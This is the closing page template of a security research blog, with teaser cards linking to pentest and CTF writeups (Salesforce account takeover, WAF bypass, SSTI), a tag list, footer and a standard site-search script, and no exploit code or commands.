  <aside id="related-posts" aria-labelledby="related-label">
    <h3 class="mb-4" id="related-label">Further Reading</h3>
    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        <article class="col">
          <a href="/posts/salesforce-hacking/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1733094000"
  data-df="ll"
  
>
  Dec  2, 2024
</time>

              <h4 class="pt-0 my-2">Pentesting Salesforce Communities</h4>
              <div class="text-muted">
                <p>This blog post shows a recent penetration test I performed for some customers' Salesforce applications (also called Salesforce Communities), in which I exploited some common and other lesser-known flaws, which eventually led to an account takeover vulnerability. I will show some plugins and in-depth techniques to facilitate the enumeration of the target and the discovery of these flaws, and I will link to other excellent resources that I have found very useful for delving into the Salesforce attack surface and on which I have relied to conduct tests and write this article.</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/waf-bypass-exploiting-parser-differentials/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1681250400"
  data-df="ll"
  
>
  Apr 12, 2023
</time>

              <h4 class="pt-0 my-2">WAF bypass and vulnerability chain exploiting parser differentials</h4>
              <div class="text-muted">
                <p>HackTheBox &quot;WAFfle-y_Order&quot; wirteup is now available!</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/ssti-in-ejs-app-using-undocumented-features/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1679954400"
  data-df="ll"
  
>
  Mar 28, 2023
</time>

              <h4 class="pt-0 my-2">Finding SSTI in an EJS app using existing exploits and undocumented features</h4>
              <div class="text-muted">
                <p>hxp 2022 &quot;valentine&quot; wirteup is now available!</p>
              </div>
            </div>
          </a>
        </article>
      
    </nav>
  </aside>
  <!-- #related-posts -->


            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/android-pentesting-lab/"
      class="btn btn-outline-primary"
      aria-label="Older"
    >
      <p>How to set up an Android Penetration Testing Lab from scratch</p>
    </a>
  

  
    <a
      href="/posts/osint-and-geoguessr-ctf/"
      class="btn btn-outline-primary"
      aria-label="Newer"
    >
      <p>Getting Started with GeoGuessr and OSINT (UMDCTF 2023)</p>
    </a>
  
</nav>

            

            <footer
  aria-label="Site Info"
  class="
    d-flex flex-column justify-content-center text-muted
    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
  "
>
  <p>Â©
    <time>2026</time>

    
      <a href="https://github.com/0xb120">0xbro</a>.
    

    
      <span
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author."
      >Some rights reserved.</span>
    
  </p>

  <p>
   Powered by â˜•, ðŸ›ðŸœðŸž, vulnerabilities and exploits
  </p>
</footer>
          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center d-none">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/hackthebox/">hackthebox</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/deserialization/">deserialization</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/android/">android</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/php/">PHP</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/interview/">interview</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/oscp/">OSCP</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/podcast/">podcast</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ato/">ATO</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/hacking-lab/">hacking-lab</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/note-taking/">note-taking</a>
      
    </div>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- Embedded scripts -->

    
      
      <!-- The comments switcher -->


    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  
  document.addEventListener('DOMContentLoaded', () => {
    SimpleJekyllSearch({
      searchInput: document.getElementById('search-input'),
      resultsContainer: document.getElementById('search-results'),
      json: '/assets/js/data/search.json',
      searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{content}</p>  </article>',
      noResultsText: '<p class="mt-5">Oops! No results found.</p>',
      templateMiddleware: function(prop, value, template) {
        if (prop === 'categories') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
          }
        }

        if (prop === 'tags') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
          }
        }
      }
    });
  });
</script>

  </body>
</html>

